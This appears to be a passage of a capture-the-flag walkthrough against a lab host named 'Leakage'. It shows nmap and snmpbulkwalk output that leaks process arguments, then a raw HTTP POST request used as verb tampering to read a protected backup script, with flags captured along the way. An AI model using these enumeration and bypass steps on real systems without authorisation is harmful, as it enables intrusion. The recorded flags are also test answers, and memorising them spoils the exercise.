
```
kali@kali ~> sudo nmap -sU --open -p 161 -sC -sV 10.13.37.11
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-19 04:45 EDT
Nmap scan report for 10.13.37.11
Host is up (0.24s latency).

Bug in snmp-win32-software: no string output.
PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-processes:
|   1:
|     Name: systemd
|   2:
|     Name: kthreadd
|   4:
|     Name: kworker/0:0H
|   6:
|     Name: mm_percpu_wq
|   7:
|     Name: ksoftirqd/0
|   8:
|     Name: rcu_sched
|   9:
|     Name: rcu_bh
|   10:
|     Name: migration/0
|   11:
|     Name: watchdog/0
|   12:
|     Name: cpuhp/0
|   13:
|     Name: cpuhp/1
|   14:
|     Name: watchdog/1
|   15:
|     Name: migration/1
|   16:
|     Name: ksoftirqd/1
|   18:
|     Name: kworker/1:0H
|   19:
|     Name: kdevtmpfs
|   20:
|     Name: netns
|   21:
|     Name: rcu_tasks_kthre
|   22:
|     Name: kauditd
|   24:
|     Name: khungtaskd
|   25:
|     Name: oom_reaper
|   26:
|     Name: writeback
|   27:
|     Name: kcompactd0
|   28:
|     Name: ksmd
|   29:
|     Name: khugepaged
|   30:
|     Name: crypto
|   31:
|     Name: kintegrityd
|   32:
|     Name: kblockd
|   33:
|     Name: ata_sff
|   34:
|     Name: md
|   35:
|     Name: edac-poller
|   36:
|     Name: devfreq_wq
|   37:
|     Name: watchdogd
|   41:
|     Name: kswapd0
|   42:
|     Name: kworker/u5:0
|   43:
|     Name: ecryptfs-kthrea
|   85:
|     Name: kthrotld
|   86:
|     Name: acpi_thermal_pm
|   87:
|     Name: scsi_eh_0
|   88:
|     Name: scsi_tmf_0
|   89:
|     Name: scsi_eh_1
|   90:
|     Name: scsi_tmf_1
|   96:
|     Name: ipv6_addrconf
|   105:
|     Name: kstrp
|   122:
|     Name: charger_manager
|   173:
|     Name: scsi_eh_2
|   174:
|     Name: scsi_tmf_2
|   175:
|     Name: scsi_eh_3
|   176:
|     Name: scsi_tmf_3
|   177:
|     Name: ttm_swap
|   178:
|     Name: irq/16-vmwgfx
|   179:
|     Name: scsi_eh_4
|   186:
|     Name: scsi_tmf_4
|   187:
|     Name: scsi_eh_5
|   190:
|     Name: scsi_tmf_5
|   191:
|     Name: scsi_eh_6
|   192:
|     Name: scsi_tmf_6
|   193:
|     Name: scsi_eh_7
|   194:
|     Name: scsi_tmf_7
|   195:
|     Name: scsi_eh_8
|   196:
|     Name: scsi_tmf_8
|   197:
|     Name: scsi_eh_9
|   198:
|     Name: scsi_tmf_9
|   199:
|     Name: scsi_eh_10
|   200:
|     Name: scsi_tmf_10
|   201:
|     Name: scsi_eh_11
|   202:
|   203:
|   204:
|   205:
|   206:
|   207:
|   208:
|   209:
|   210:
|   211:
|   213:
|   214:
|   215:
|   216:
|   217:
|   218:
|   219:
|   235:
|   237:
|   238:
|   240:
|   241:
|   242:
|   243:
|   244:
|   245:
|   247:
|   248:
|   249:
|   250:
|   251:
|   252:
|   253:
|   255:
|   256:
|   257:
|   258:
|   259:
|   260:
|   263:
|   264:
|   301:
|   302:
|   372:
|   419:
|   420:
|   487:
|   492:
|   493:
|   494:
|   495:
|   496:
|   497:
|   507:
|   517:
|   539:
|   544:
|   547:
|   696:
|   697:
|   833:
|   857:
|   914:
|   919:
|   920:
|   923:
|   926:
|   934:
|   936:
|   944:
|   945:
|   946:
|   973:
|   999:
|   1013:
|   1014:
|   1020:
|   1023:
|   1227:
|   1228:
|   1229:
|   1230:
|   1231:
|   1232:
|   1235:
|   1236:
|   1241:
|   1243:
|   12765:
|   13579:
|   13668:
|   13669:
|   13670:
|   13925:
|   13926:
|   13935:
|   13936:
|   16596:
|   16695:
|   16736:
|   16737:
|   16942:
|   16943:
|   16944:
|   16947:
|   16948:
|   16949:
|   22394:
|   22395:
|   22396:
|   22397:
|   22398:
|   22632:
|   23209:
|   23410:
|   24028:
|   24079:
|   24129:
|   24181:
|   30788:
|   30799:
|   30800:
|   30918:
|_  30919:
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 423f5e76cd7abe5e00000000
|   snmpEngineBoots: 6
|_  snmpEngineTime: 5d11h29m15s
| snmp-interfaces:
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Traffic stats: 96.13 Mb sent, 96.13 Mb received
|   Intel Corporation 82545EM Gigabit Ethernet Controller (Copper)
|     IP address: 10.13.37.11  Netmask: 255.255.255.0
|     MAC address: 00:50:56:b0:d2:71 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|_    Traffic stats: 543.93 Mb sent, 1.97 Gb received
| snmp-netstat:
|   TCP  0.0.0.0:22           0.0.0.0:0
|   TCP  0.0.0.0:80           0.0.0.0:0
|   TCP  0.0.0.0:5000         0.0.0.0:0
|   TCP  10.13.37.11:5000     10.10.14.6:53740
|   TCP  10.13.37.11:5000     10.10.14.15:33368
|   TCP  10.13.37.11:37322    10.10.14.2:9001
|   TCP  10.13.37.11:49008    10.10.14.6:6969
|   TCP  10.13.37.11:54562    10.10.14.15:4444
|   TCP  127.0.0.1:3306       0.0.0.0:0
|   TCP  127.0.0.53:53        0.0.0.0:0
|   UDP  0.0.0.0:161          *:*
|   UDP  0.0.0.0:39160        *:*
|_  UDP  127.0.0.53:53        *:*
| snmp-sysdescr: Linux Leakage 4.15.0-72-generic #81-Ubuntu SMP Tue Nov 26 12:20:02 UTC 2019 x86_64
|_  System uptime: 5d11h29m14.99s (47335499 timeticks)
Service Info: Host: Leakage

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.35 seconds

```


```
kali@kali ~> snmpbulkwalk -v2c -c public 10.13.37.11
iso.3.6.1.2.1.1.1.0 = STRING: "Linux Leakage 4.15.0-72-generic #81-Ubuntu SMP Tue Nov 26 12:20:02 UTC 2019 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (47563735) 5 days, 12:07:17.35
iso.3.6.1.2.1.1.4.0 = STRING: "Me <me@example.org>"
iso.3.6.1.2.1.1.5.0 = STRING: "Leakage"
iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (7) 0:00:00.07
<...SNIP...>
<...SNIP...>
<...SNIP...>
<...SNIP...>
<...SNIP...>
<...SNIP...>
iso.3.6.1.2.1.25.4.2.1.5.1023 = STRING: "--daemonize --pid-file=/run/mysqld/mysqld.pid"
iso.3.6.1.2.1.25.4.2.1.5.1227 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.1228 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.1229 = STRING: "-c /opt/check_backup.sh" <--------------------------------------- check me 
iso.3.6.1.2.1.25.4.2.1.5.1230 = STRING: "-c /opt/check_devSite.sh" <--------------------------------------- check me
iso.3.6.1.2.1.25.4.2.1.5.1231 = STRING: "/opt/check_backup.sh" <------------------------------------------------------- check me
iso.3.6.1.2.1.25.4.2.1.5.1232 = STRING: "/opt/check_devSite.sh" <---------------------------------------- check me
iso.3.6.1.2.1.25.4.2.1.5.1235 = STRING: "/var/www/html/dev/space_dev.py" <--------------------------- check me
iso.3.6.1.2.1.25.4.2.1.5.1236 = STRING: "/var/www/html/scripts/backup_every_17minutes.sh AKERVA{IkN0w_SnMP@@@MIsconfigur@T!onS}" <---------------------- important
```



```
POST /scripts/backup_every_17minutes.sh HTTP/1.1
Host: 10.13.37.11
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en
Accept-Encoding: gzip, deflate, br
Cookie: wordpress_test_cookie=WP+Cookie+check
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```



```
HTTP/1.1 200 OK
Date: Wed, 19 Jun 2024 10:23:27 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Sat, 07 Dec 2019 01:02:50 GMT
ETag: "196-59912b8b37f2f"
Accept-Ranges: bytes
Content-Length: 406
Connection: close
Content-Type: text/x-sh



#!/bin/bash
#
# This script performs backups of production and development websites.
# Backups are done every 17 minutes.
#
# AKERVA{IKNoW###VeRbTamper!nG_==}
#

SAVE_DIR=/var/www/html/backups

while true
do
	ARCHIVE_NAME=backup_$(date +%Y%m%d%H%M%S)
	echo "Erasing old backups..."
	rm -rf $SAVE_DIR/*

	echo "Backuping..."
	zip -r $SAVE_DIR/$ARCHIVE_NAME /var/www/html/*

	echo "Done..."
	sleep 1020
done
```